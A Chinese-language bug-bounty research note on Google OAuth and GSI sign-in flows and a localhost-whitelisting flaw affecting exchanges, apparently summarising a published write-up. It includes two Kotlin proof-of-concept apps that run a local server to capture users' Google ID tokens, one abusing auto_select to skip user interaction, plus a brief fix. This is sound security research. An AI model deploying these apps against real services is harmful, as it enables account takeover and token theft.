#区块链 #web3 #bugbounty #oauth #cors

- https://osec.io/blog/2025-10-16-how-we-broke-exchanges-oauth-misconfigurations



## Oauth

### Google身份验证流程
#google_oauth #oauth 

- Google身份验证流：
	- GSI ： 通过`postMessage` 与依赖方（RP）通信
	- Oauth2.0 Old Flow ：使用`redirect_uri`将令牌（token）发送回RP 


#### GSI

GSI向RP验证用户的两种方法：
- FedCM API
- 不使用FedCM API

##### FedCM Method

>[FedCM]([https://privacysandbox.google.com/cookies/fedcm/why#user-interaction])（Federated Credentials Manager）是一个新的浏览器API，允许用户使用第三方IdP对RP进行本地身份验证。


- 用户可以通过点击登录按钮（这将打开一个“选择您的帐户”提示窗口）![](media/Pasted%20image%2020251127005628.png)
- 或通过1-tap UX（见下图）登录![](media/Pasted%20image%2020251127005905.png) 
- 这两个流都使用FedCM API来使用Google IdP服务进行身份验证，该服务向IdP服务器发出一些CORS请求以返回令牌。在第一次验证后，当用户在一段时间后返回同一网站时，可以使用[FedCM自动重新验证自动重新验证](https://github.com/w3c-fedid/FedCM/issues/429)，这具有必须满足的某些先决条件。


##### 不使用FedCM API

>该方法使用弹出窗口（或iframe）打开Google OAuth同意页面并通过`postMessage`返回令牌：

1. 用户单击登录按钮
2. RP打开一个弹出窗口（iframe）到[https：//accounts.google.com/o/oauth2/v2/auth](https://accounts.google.com/o/oauth2/v2/auth)，其中包含一些重要参数，如`client_id`和`origin`
3. 用户点击“继续”按钮授权认证
4. 他们会被重定向到[https：//accounts.google.com/gsi/transform](https://accounts.google.com/gsi/transform)
5. /gsi/transform通过`postMessage`将令牌发送回RP（在一些SYN/ACK消息之后）

#### Oauth2.0 Old Flow
>旧流程将用户重定向到Google OAuth同意页面，然后通过URL中提供的`redirect_uri`返回令牌，并通过白名单配置进行验证：

1. 用户单击登录按钮
2. RP打开一个弹出窗口/iframe到[https：//accounts.google.com/o/oauth2/v2/auth](https://accounts.google.com/o/oauth2/v2/auth)，其中包含一些重要参数，如`client_id`和`origin`
3. 用户点击“继续”按钮授权认证
4. 它们会被重定向到`redirect_uri`，并在查询参数中使用令牌，或者被重定向到`location.hash`

#### 不同配置
这两个流必须在Google Cloud Console中进行不同的配置。我们可以控制两种白名单配置：
- Authorized origins授权来源
- Authorized redirect URIs授权重定向URI

![](media/Pasted%20image%2020251127011437.png)  

GSI流不使用任何重定向来将令牌发送回RP，因此授权的重定向URI在GSI流中并不那么重要。它使用授权的来源来验证RP页面是否真的被允许使用`client_id`进行身份验证。

> 关注新授权和旧授权 的区别 （redirect_uri），之后做类似研究 可以注意一下！！！！⭐

- GSI流中的实际验证发生在FedCM发出的CORS请求中，或者通过检查`/oauth2/v2/auth`查询参数发生在`origin`中。
- **注意**：新的GSI流也可以使用`redirect_uri`验证具有不同的流。要执行此流程，您需要在使用SDK时指定[login_uri](https://developers.google.com/identity/gsi/web/reference/js-reference#login_uri)。

### 本地主机漏洞

- **前提**：开发人员经常将`localhost`源列入白名单，因为它被认为是值得信任的本地测试。

~~(实际上，这是部分正确的，因为这取决于您所做的安全假设。这在移动的环境中可能是一个问题，因为**移动的应用程序可以在没有很多权限的情况下打开本地主机Web服务器**，并且安装恶意应用程序在移动的上并不被认为是一个重大问题，因为所有应用程序都是沙箱。此配置允许**恶意应用程序“逃离”沙箱并攻击另一个系统。**)~~

#### EXP

##### Oauth2.0 Old Flow
- 为了利用这种错误配置，我们首先需要了解目标使用的OAuth流。如果OAuth实现遵循标准流程而不使用Google Sign-In（GSI），则可以通过`location.hash`或`location.search`提取令牌。为了实现这一点，我们开发了一个Kotlin应用程序，它可以启动本地Web服务器：

```kotlin
 override fun onCreate(savedInstanceState: Bundle?){
        super.onCreate(savedInstanceState)

        // Start the Ktor web server
        CoroutineScope(Dispatchers.IO).launch {
            try {
                startWebServer()
                Log.d("WebServer", "Server started on http://localhost:3000")
            } catch (e: Exception) {
                Log.e("WebServer", "Error starting server: ${e.message}", e)
            }
        }

        // Open the Google OAuth page
        val googleOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=redacted&redirect_uri=http://localhost:3000/auth/index.html&response_type=id_token&scope=email&nonce=redacted&prompt=select_account&service=lso&o2v=2&flowName=GeneralOAuthFlow"
        val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse(googleOAuthUrl))
        startActivity(browserIntent)
    }

    private fun startWebServer() {
        embeddedServer(CIO, port = 3000) {
            routing {
                get("{...}") {
                    call.respondHtml {
                        head {
                            meta(charset = "UTF-8")
                            meta(name = "viewport", content = "width=device-width, initial-scale=1.0")
                            title("OAuth Redirect")
                        }
                        body {
                            h1 { +"Google OAuth Redirect" }
                            script {
                                +"document.body.innerText = location.hash;"
                            }
                        }
                    }
                }
            }
        }.start(wait = true)
    }
```


#### GSI

>如果正在使用Google Sign-In（GSI），我们发现可以使用`auto_select`参数来触发自动重新身份验证并绕过用户交互：


```kotlin
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        CoroutineScope(Dispatchers.IO).launch {
            try {
                startWebServer()
                Log.d("WebServer", "Server started on http://localhost:3000")
            } catch (e: Exception) {
                Log.e("WebServer", "Error starting server: ${e.message}", e)
            }
        }

        val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse("http://localhost:3000"))
        startActivity(browserIntent)
    }

    private fun startWebServer() {
        embeddedServer(CIO, port = 3000) {
            routing {
                get("{...}") {
                    call.respondHtml {
                        head {
                            title("Test")
                            script {
                                src = "https://accounts.google.com/gsi/client"
                                attributes["async"] = ""
                                attributes["defer"] = ""
                            }
                            script {
                                unsafe {
                                    +"""
    function handleCredentialResponse(response) {
      alert("credential: " + response.credential);
    }

    window.onload = async function () {
      const oauth_url = new URL(`https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?as=uolEFCMgoGJXBVuGdJja0XdzjrWqOE6iFaK1SBNY9Zk&client_id=redacted&scope=openid%20email%20profile&response_type=id_token&gsiwebsdk=gis_attributes&redirect_uri=http%3A%2F%2Flocalhost%3A3000&response_mode=form_post&origin=http%3A%2F%2Flocalhost%3A3000&display=popup&prompt=select_account&gis_params=ChFodHRwczovL2F6Yml0LmNvbRIRaHR0cHM6Ly9hemJpdC5jb20YByordW9sRUZDTWdvR0pYQlZ1R2RKamEwWGR6anJXcU9FNmlGYUsxU0JOWTlaazJINzE3OTQyNTg0NjQyLXVrb25tbDZkNXM0MjJrZWVpa2RmMTJwdnV1aG1sOWYyLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tOAFCQDI0NDlkNGMwMTI3NDQxNGRlMzg5YjFlYjE1MzFmYTAxYTdjM2M5MTFhOTMxNzIxNGJhZTFmODkzNjE2MzIxZDA&service=lso&o2v=1&flowName=GeneralOAuthFlow`);
      const client_id = oauth_url.searchParams.get("client_id");
      google.accounts.id.initialize({
        client_id: client_id,
        callback: handleCredentialResponse,
        auto_select: true
      });

      google.accounts.id.renderButton(
        document.getElementById("g_id_signin"),
        { theme: "outline", size: "large" }
      );

      google.accounts.id.prompt();
    };
                                    """.trimIndent()
                                }
                            }
                        }
                        body {
                            h1 { +"Login here:" }
                            div {
                                id = "g_id_signin"
                            }
                        }
                    }
                }
            }
        }.start(wait = true)
    }
```


#### Fix
缓解此问题的正确方法是在实时环境中禁止localhost。开发人员应该有一个单独的staging OAuth环境，并使用不同的客户端ID进行测试。确保使用测试客户端ID生成的令牌在实际环境中无效是很重要的。


